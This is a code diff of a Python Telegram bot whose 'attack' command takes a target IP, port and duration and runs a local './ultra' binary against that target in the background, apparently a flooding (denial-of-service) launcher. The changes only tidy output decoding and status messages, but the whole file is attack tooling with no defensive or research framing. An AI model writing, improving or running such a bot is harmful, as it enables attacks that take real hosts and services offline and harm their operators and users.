@@ -14,7 +14,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def run_attack(chat_id, ip, port, duration, context):
     try:
-        # 🔧 Run process
         process = await asyncio.create_subprocess_exec(
             "./ultra", ip, port, duration, "800",
             stdout=asyncio.subprocess.PIPE,
@@ -23,28 +22,29 @@ async def run_attack(chat_id, ip, port, duration, context):
 
         stdout, stderr = await process.communicate()
 
-        # 🔍 Exit code check
-        exit_code = process.returncode
+        # ✅ SAFE decode (no UTF error)
+        out = stdout.decode(errors="ignore") if stdout else ""
+        err = stderr.decode(errors="ignore") if stderr else ""
 
-        if stdout:
-            print(stdout.decode())
+        if out:
+            print("[stdout]\n", out)
 
-        if stderr:
+        if err:
             await context.bot.send_message(
                 chat_id=chat_id,
-                text=f"⚠️ Error:\n{stderr.decode()}"
+                text=f"⚠️ Error:\n{err}"
             )
 
-        # ✅ Proper completion message
-        if exit_code == 0:
+        # ✅ exit status check
+        if process.returncode == 0:
             await context.bot.send_message(
                 chat_id=chat_id,
-                text="✅ Process Completed Successfully"
+                text="✅ Completed successfully"
             )
         else:
             await context.bot.send_message(
                 chat_id=chat_id,
-                text=f"❌ Process Failed (code {exit_code})"
+                text=f"❌ Failed (code {process.returncode})"
             )
 
     except Exception as e:
@@ -57,7 +57,6 @@ async def run_attack(chat_id, ip, port, duration, context):
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # 🔒 Access control
     if user_id != ALLOWED_USER_ID:
         await update.message.reply_text("❌ Unauthorized")
         return
@@ -72,8 +71,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚔️ Running...\nTarget: {ip}:{port}\nTime: {duration}s"
     )
 
-    # 🔥 Run in background
-    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context))
+    # background run
+    asyncio.create_task(
+        run_attack(update.effective_chat.id, ip, port, duration, context)
+    )
 
 
 def main():
